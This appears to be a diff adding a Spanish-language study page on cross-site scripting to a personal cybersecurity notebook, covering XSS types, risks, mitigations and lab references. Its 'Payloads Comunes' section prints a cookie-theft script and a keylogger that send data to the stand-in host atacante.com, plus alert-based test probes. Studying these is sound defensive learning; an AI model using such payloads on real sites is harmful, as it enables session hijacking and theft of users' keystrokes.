@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS (Cross-Site Scripting) - Teoría</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>XSS (Cross-Site Scripting)</h1>
+        <nav>
+            <ul>
+                <li><a href="index.html">Inicio</a></li>
+                <li><a href="dashboard.html">Máquinas Resueltas</a></li>
+                <li><a href="theory.html">Teoría</a></li>
+                <li><a href="writeup.html">Nuevo Write-up</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <article class="theory-content">
+            <section class="theory-intro">
+                <h2>Descripción Técnica</h2>
+                <p>Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad que permite a atacantes inyectar scripts maliciosos en páginas web vistas por otros usuarios. Estos scripts se ejecutan en el contexto del navegador de la víctima, permitiendo robo de cookies, secuestro de sesiones o redirección a sitios maliciosos.</p>
+            </section>
+
+            <section class="theory-details">
+                <h2>Tipos de XSS</h2>
+                
+                <h3>XSS Reflejado</h3>
+                <p>El script malicioso se refleja desde el servidor inmediatamente después de la solicitud, generalmente a través de parámetros de URL.</p>
+                
+                <h3>XSS Almacenado</h3>
+                <p>El script se almacena en el servidor (en una base de datos, comentarios, etc.) y se ejecuta cada vez que se carga la página afectada.</p>
+                
+                <h3>XSS Basado en DOM</h3>
+                <p>La vulnerabilidad existe en el lado del cliente, donde JavaScript modifica el DOM utilizando datos no confiables.</p>
+
+                <h2>Riesgos</h2>
+                <ul>
+                    <li>Robo de cookies de sesión</li>
+                    <li>Secuestro de cuentas</li>
+                    <li>Defacement de sitios web</li>
+                    <li>Ejecución de acciones en nombre del usuario</li>
+                    <li>Redirección a sitios maliciosos</li>
+                </ul>
+            </section>
+
+            <section class="theory-commands">
+                <h2>Payloads Comunes</h2>
+                
+                <h3>XSS Básico</h3>
+                <div class="code-block">
+                    <pre><code class="language-javascript">&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;</code></pre>
+                </div>
+
+                <h3>Robo de Cookies</h3>
+                <div class="code-block">
+                    <pre><code class="language-javascript">&lt;script&gt;
+document.location='http://atacante.com/steal?cookie='+document.cookie
+&lt;/script&gt;</code></pre>
+                </div>
+
+                <h3>Keylogger</h3>
+                <div class="code-block">
+                    <pre><code class="language-javascript">&lt;script&gt;
+document.onkeypress = function(e) {
+    fetch('http://atacante.com/log?key=' + e.key);
+}
+&lt;/script&gt;</code></pre>
+                </div>
+            </section>
+
+            <section class="theory-examples">
+                <h2>Ejemplos de Laboratorio</h2>
+                
+                <h3>Entorno Seguro</h3>
+                <ul>
+                    <li>DVWA (Damn Vulnerable Web Application)</li>
+                    <li>XSS Game (Google)</li>
+                    <li>PortSwigger Web Security Academy</li>
+                </ul>
+
+                <h3>Detección</h3>
+                <div class="code-block">
+                    <pre><code># Probar en campos de entrada
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Probar en parámetros URL
+http://ejemplo.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                </div>
+            </section>
+
+            <section class="theory-mitigation">
+                <h2>Mitigaciones</h2>
+                <ul>
+                    <li>Validación y sanitización de entrada</li>
+                    <li>Escapado de salida (HTML encoding)</li>
+                    <li>Content Security Policy (CSP)</li>
+                    <li>HttpOnly flag en cookies</li>
+                    <li>Uso de frameworks seguros</li>
+                </ul>
+            </section>
+
+            <section class="related-writeups">
+                <h2>Write-ups Relacionados</h2>
+                <div id="xss-writeups-list"></div>
+            </section>
+
+            <section class="theory-references">
+                <h2>Referencias</h2>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP XSS</a></li>
+                    <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger XSS</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Prevention Cheat Sheet</a></li>
+                </ul>
+            </section>
+        </article>
+    </main>
+
+    <footer>
+        <p>Cuaderno Personal de Ciberseguridad &copy; 2025</p>
+        <p class="warning">Recuerda redactar información sensible antes de publicar</p>
+    </footer>
+
+    <script src="js/theory.js"></script>
+</body>
+</html>
